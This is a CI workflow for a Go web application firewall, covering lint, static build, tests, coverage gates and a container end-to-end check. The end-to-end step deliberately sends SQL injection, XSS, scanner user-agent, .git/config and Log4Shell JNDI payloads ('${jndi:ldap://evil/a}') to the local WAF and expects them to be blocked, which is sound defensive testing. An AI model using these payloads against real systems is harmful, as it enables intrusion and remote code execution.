name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

env:
  GO_VERSION: "1.22"
  NODE_VERSION: "22"
  # Pinned so local runs (scoop/brew/install.sh) and CI agree on the rule set.
  GOLANGCI_LINT_VERSION: "v2.15.0"

jobs:
  # Fast feedback. No C++ or Node toolchain: the embedded ui/dist/placeholder.html
  # keeps the ui package compilable, and golangci-lint only loads Go packages.
  lint:
    name: Lint & format
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          # .golangci.yml uses `new-from-merge-base: origin/main`, which needs a
          # full history to resolve the merge base.
          fetch-depth: 0

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Install golangci-lint
        run: |
          curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/HEAD/install.sh \
            | sh -s -- -b "$(go env GOPATH)/bin" "${GOLANGCI_LINT_VERSION}"

      # Runs the linters plus the gofmt -s formatter configured in .golangci.yml,
      # so there is no separate formatting step to drift out of sync.
      - name: golangci-lint
        env:
          # Constitution §2.1: Linux is the sole production runtime. GOOS=linux is
          # what makes engine_unix.go (not engine_windows.go) the linted file.
          GOOS: linux
          # CGO_ENABLED=0 keeps this job self-contained: no C toolchain and no
          # submodules are needed to lint. There is no cgo shim left to skip, since
          # the open-appsec C++ bridge was removed (see third_party/README.md).
          CGO_ENABLED: "0"
        run: golangci-lint run ./...

  # Constitution §2.1: waf-api and waf-agent must be pure static binaries.
  static-build:
    name: Static build (CGO_ENABLED=0, linux)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Build
        run: CGO_ENABLED=0 GOOS=linux go build -buildvcs=false -o bin/ ./cmd/...

      - name: Assert static linkage
        run: |
          status=0
          for b in waf-api waf-agent; do
            out=$(ldd "bin/$b" 2>&1 || true)
            case "$out" in
              *"not a dynamic executable"*|*"statically linked"*)
                echo "OK  $b is statically linked"
                ;;
              *)
                echo "::error file=cmd/$b/main.go::$b is not a static binary (Constitution §2.1): $out"
                status=1
                ;;
            esac
          done
          exit $status

  test:
    name: Test (race, full module)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          submodules: recursive

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Set up Node
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: npm
          cache-dependency-path: ui/package-lock.json

      # -race needs a C toolchain; nothing else in this job compiles C. The old
      # open-appsec build pulled a dozen -dev libraries plus cmake, bison and flex
      # on every run to produce a shim that was never enabled.
      - name: Install C toolchain for -race
        run: sudo apt-get update -qq && sudo apt-get install -y -qq build-essential

      # ui/embed.go embeds all:dist, and TestAPI_RootServesDashboardForHTMLClients
      # asserts the Vite shell is served. Without this step the suite fails.
      - name: Build UI
        run: cd ui && npm ci && npm run build

      # -race requires CGO, so the environment default (CGO_ENABLED=1) is used here.
      # ./... (not ./internal/...) so cmd/ is covered too.
      #
      # third_party is excluded explicitly: it holds the nginx C sources (a
      # submodule, not Go code). A vendored tree that ever ships `import "C"`
      # files must not become a package needing modules absent from go.mod.
      #
      # -coverpkg covers the whole module so statements exercised across package
      # boundaries are counted. Without it, the inspection pipeline driven from
      # cmd/waffynx reports as untested.
      # -json goes to a file so the inventory gate below can read what actually
      # ran. A green exit code alone cannot tell an empty suite from a full one.
      - name: Test
        id: tests
        run: |
          mkdir -p .artifacts
          pkgs=$(go list ./... | grep -v '/third_party/')
          coverpkgs=$(echo "$pkgs" | paste -sd, -)
          go test -race -json -coverpkg="$coverpkgs" -coverprofile=coverage.out $pkgs \
            > .artifacts/go-test.json

      # Minimum inventory: floor, required tests, declared skips only. A green
      # exit code cannot tell an empty suite from a full one.
      - name: Test inventory
        if: always()
        run: go run ./tools/gatecheck tests -json .artifacts/go-test.json

      # Measured with -benchmem and parsed, never written by hand: the numbers are
      # per-toolchain (same code: 26 allocs on go1.26, 31 on go1.22) and allocs/op
      # is the invariant Constitution §1.2 actually cares about.
      - name: Benchmark inventory
        id: bench
        run: |
          mkdir -p .artifacts
          go test -run '^$' -bench . -benchmem -benchtime=200x ./cmd/... ./internal/... \
            > .artifacts/bench.txt
          go run ./tools/gatecheck bench -out .artifacts/bench.txt

      # A corpus with no seeds proves nothing, and seeds live in the AST (f.Add)
      # as often as in testdata/fuzz, so both are counted.
      - name: Fuzz seed inventory
        id: fuzz
        run: go run ./tools/gatecheck fuzz -root .

      # Nothing is satisfied by absence, including the gates themselves: a step
      # that never reported success makes the report say fail, and verify refuses
      # a report that is missing a gate or describes a different tree.
      - name: Gate report
        if: always()
        env:
          TESTS: ${{ steps.tests.outcome }}
          BENCH: ${{ steps.bench.outcome }}
          FUZZ: ${{ steps.fuzz.outcome }}
        run: |
          mkdir -p .artifacts
          status() { case "$1" in success) echo pass ;; *) echo fail ;; esac; }
          go run ./tools/gatecheck report -out .artifacts/gate-report.json \
            -gate tests="$(status "$TESTS")" \
            -gate bench="$(status "$BENCH")" \
            -gate fuzz="$(status "$FUZZ")"
          go run ./tools/gatecheck verify -report .artifacts/gate-report.json \
            -expect tests,bench,fuzz

      # Per-package minimums, not a single global percentage: a global total is
      # dominated by whichever package has the most statements and hides
      # regressions in small security-critical ones. Floors only ratchet up.
      #
      # `set -o pipefail` is load-bearing: without it the pipeline reports tee's
      # exit status, so the gate could fail and the job would still go green.
      - name: Coverage gates
        run: |
          set -o pipefail
          go run ./tools/covergate -profile coverage.out | tee coverage.txt

      - name: Coverage summary
        run: |
          {
            echo '### Coverage'
            echo '```'
            cat coverage.txt
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: coverage.out

      - name: Upload bridge artifacts
        uses: actions/upload-artifact@v4
        with:
          name: bridge-libs
          path: bin/*.so

  # The only job that proves the product rather than the code: build the image,
  # run it with nothing but environment variables, and check that a real nginx
  # accepts the rendered config, proxies benign traffic and blocks an attack.
  #
  # Until this job existed nothing in CI built nginx or the image at all, which is
  # how a Dockerfile that could never build survived in the tree.
  container-e2e:
    name: Container e2e (one-command bootstrap)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          submodules: recursive

      - name: Build the image
        run: docker build -f deploy/docker/Dockerfile -t waffynx:e2e .

      - name: Start an upstream
        run: |
          docker network create wx-e2e
          docker run -d --name wx-backend --network wx-e2e nginx:alpine

      - name: Start Waffynx with no config file at all
        run: |
          docker run -d --name wx-waf --network wx-e2e -p 18080:8080 \
            -e WAFFYNX_SITE_HOST=app.example.test \
            -e WAFFYNX_SITE_UPSTREAM=wx-backend:80 \
            waffynx:e2e

      - name: Assert it protects the site
        id: protect
        run: |
          set -euo pipefail

          for _ in $(seq 1 40); do
            if curl -sf -o /dev/null --max-time 2 http://localhost:18080/health; then break; fi
            sleep 1
          done

          code() { curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$@"; }
          check() {
            local want="$1" got="$2" what="$3"
            if [ "$got" != "$want" ]; then
              echo "::error::$what: expected $want, got $got"
              return 1
            fi
            echo "ok   $what -> $got"
          }

          rc=0
          # The orchestrator probe must not depend on the topology.
          check 200 "$(code http://localhost:18080/health)" "health" || rc=1
          # A site created from environment variables alone must be served.
          check 200 "$(code -H 'Host: app.example.test' http://localhost:18080/)" "benign request proxied" || rc=1
          check 200 "$(code -H 'Host: app.example.test' 'http://localhost:18080/?page=2&limit=10')" "benign query allowed" || rc=1
          # ...and must be inspected.
          check 403 "$(code -H 'Host: app.example.test' 'http://localhost:18080/?q=UNION+SELECT+1,2,3')" "SQLi blocked" || rc=1
          check 403 "$(code -H 'Host: app.example.test' 'http://localhost:18080/?q=%3Cscript%3Ealert(1)%3C/script%3E')" "XSS blocked" || rc=1
          # Encoding evasions: the body used to be matched raw, so a form POST and a
          # JSON escape both reached the upstream while the same payload in the
          # query string was blocked.
          check 403 "$(code -H 'Host: app.example.test' --data 'q=UNION+SELECT+1,2,3' http://localhost:18080/)" "form-encoded SQLi blocked" || rc=1
          check 403 "$(code -H 'Host: app.example.test' -H 'Content-Type: application/json' --data '{"q":"\u003cscript\u003ealert(1)\u003c/script\u003e"}' http://localhost:18080/)" "JSON unicode escape blocked" || rc=1
          # A body above the inspection buffer used to be forwarded uninspected.
          big="$(head -c 40000 /dev/zero | tr '\0' a)<script>alert(1)</script>"
          check 403 "$(code -H 'Host: app.example.test' --data "$big" http://localhost:18080/)" "large body inspected" || rc=1

          # Managed ruleset classes the plugin chain never inspected.
          check 403 "$(code -H 'Host: app.example.test' -H 'User-Agent: sqlmap/1.7.2' http://localhost:18080/)" "scanner user-agent blocked" || rc=1
          check 403 "$(code -H 'Host: app.example.test' http://localhost:18080/.git/config)" "vcs config file blocked" || rc=1
          check 403 "$(code -H 'Host: app.example.test' -H 'X-Api-Version: ${jndi:ldap://evil/a}' http://localhost:18080/)" "log4shell header blocked" || rc=1

          # An unconfigured host must not be forwarded anywhere.
          check 404 "$(code -H 'Host: otro.example.test' http://localhost:18080/)" "unknown host refused" || rc=1

          exit $rc

      # The e2e result is bound to the tree it ran against: a report that only
      # names a commit can attach "verified" to code that was never verified. And
      # if this step never runs, verify fails rather than passing by absence.
      - name: E2E gate report
        if: always()
        env:
          PROTECT: ${{ steps.protect.outcome }}
        run: |
          mkdir -p .artifacts
          status() { case "$1" in success) echo pass ;; *) echo fail ;; esac; }
          go run ./tools/gatecheck report -out .artifacts/gate-report.json \
            -gate e2e="$(status "$PROTECT")"
          go run ./tools/gatecheck verify -report .artifacts/gate-report.json \
            -expect e2e

      - name: Container logs
        if: failure()
        run: |
          docker logs wx-waf || true
          docker exec wx-waf cat /opt/waffynx/logs/nginx-error.log || true

      - name: Clean up
        if: always()
        run: |
          docker rm -f wx-waf wx-backend || true
          docker network rm wx-e2e || true
